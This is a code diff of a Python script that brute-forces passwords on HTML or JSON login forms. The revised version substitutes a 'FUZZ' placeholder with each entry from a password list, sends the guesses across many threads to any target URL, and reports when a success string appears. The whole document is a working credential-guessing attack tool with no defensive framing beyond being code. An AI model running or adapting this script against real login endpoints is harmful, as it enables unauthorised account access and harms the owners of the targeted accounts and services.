@@ -1,79 +1,91 @@
-import argparse, threading, queue, requests
-from urllib.parse import urlparse, urljoin
+import argparse
+import threading
+import queue
+import requests
+import json
 
-
-parser = argparse.ArgumentParser(description="A fast password guesser for HTML Form")
-parser.add_argument('-u', '--url', help='Enter the url of form action')
-parser.add_argument('-d', '--data', help='Enter the exact query string(In case of GET) and body data (in case of POST)')
-parser.add_argument('-m', '--method', help='Enter the form method (GE/POST)')
-parser.add_argument('-f', '--field', help='Enter the key name to be bruteforced')
-parser.add_argument('-s', '--success_message', help="Enter the message in case of sucessful login")
-parser.add_argument('-t', '--threads', help="Enter the number of threads to run")
+parser = argparse.ArgumentParser(description=" Fast Password Guesser for HTML/JSON forms")
+parser.add_argument('-u', '--url', help='Target form action URL', required=True)
+parser.add_argument('-d', '--data', help='Request data. Use FUZZ as the password placeholder.', required=True)
+parser.add_argument('-m', '--method', help='Request method: GET or POST', required=True)
+parser.add_argument('-s', '--success_message', help="Text to identify successful login (e.g., token)", required=True)
+parser.add_argument('-t', '--threads', help="Number of threads to use", required=True)
 
 args = parser.parse_args()
+
 url = args.url
-data = args.data
-method = args.method
-success_message = args.success_message
+data_template = args.data
+method = args.method.upper()
+success_message = args.success_message.lower()
 threads = int(args.threads)
-field = args.field
 
-session = requests.Session()
-session.headers['User-agent'] = "Chrome/51.0.2704.103 Safari/537.36"
-if method == 'POST':
-    session.headers['Content-type'] = 'application/x-www-form-urlencoded'
-
+# Detect if data is JSON
+is_json = False
 try:
-    requests.get(url)
+    json.loads(data_template.replace("FUZZ", "test"))
+    is_json = True
 except:
-    print("[+] Can't connect to url..")
+    pass
+
+# Setup session
+session = requests.Session()
+session.headers['User-Agent'] = "Mozilla/5.0 (BruteForceBot)"
+if is_json:
+    session.headers['Content-Type'] = 'application/json'
+else:
+    session.headers['Content-Type'] = 'application/x-www-form-urlencoded'
+
+# Connectivity check
+try:
+    test_conn = session.get(url, timeout=5)
+except Exception as e:
+    print(f"[x] Can't connect to {url}: {e}")
     exit()
+
 guessed = False
 correct_password = ''
+q = queue.Queue()
 
+# Load passwords into queue
+with open('password.txt', 'r') as file:
+    for password in file.read().splitlines():
+        q.put(password)
 
+# Brute-force logic
 def http_guesser():
     global guessed, correct_password
     while not guessed and not q.empty():
         current_pass = q.get()
         try:
-            print(f"[+] Trying.. {current_pass}")
-            pairs = data.split('&')
+            print(f"[+] Trying: {current_pass}")
+            if is_json:
+                payload = json.loads(data_template.replace("FUZZ", current_pass))
+                res = session.request(method, url, timeout=5, json=payload, allow_redirects=True)
+            else:
+                payload = data_template.replace("FUZZ", current_pass)
+                res = session.request(method, url, timeout=5, data=payload, allow_redirects=True)
 
-            for j in range(len(pairs)):
-                if field in pairs[j]:
-                    field_array = [field, current_pass]
-                    pairs[j] = '='.join(field_array)
-            data_new = '&'.join(pairs)
-            # print(f"New data: {data_new}")
-
-            res = session.request(method, url, timeout=3, data=data_new, allow_redirects=True)
-            if success_message in res.content.decode().lower():
-                print(f"[+] Success message triggered on {current_pass}")
-                correct_password = current_pass
+            if success_message in res.text.lower():
+                print(f"[:)] Success! Password: {current_pass}")
                 guessed = True
-        except:
-            pass
+                correct_password = current_pass
+        except Exception as e:
+            print(f"[x] Error: {e}")
         q.task_done()
 
-q = queue.Queue()
-
-with open('password.txt', 'r') as file:
-    for password in file.read().splitlines():
-        q.put(password)
-
+# Start threads
 thread_list = []
-for i in range(threads):
+for _ in range(threads):
     t = threading.Thread(target=http_guesser, daemon=True)
     t.start()
     thread_list.append(t)
 
+# Wait for completion
 for th in thread_list:
     th.join()
 
-
+# Result
 if guessed:
-    print(f"[+] Password found: {correct_password}")
+    print(f"[✔️] Cracked! Correct password: {correct_password}")
 else:
-    print(f"[+] Password not found")
-
+    print("[❌] Password not found.")
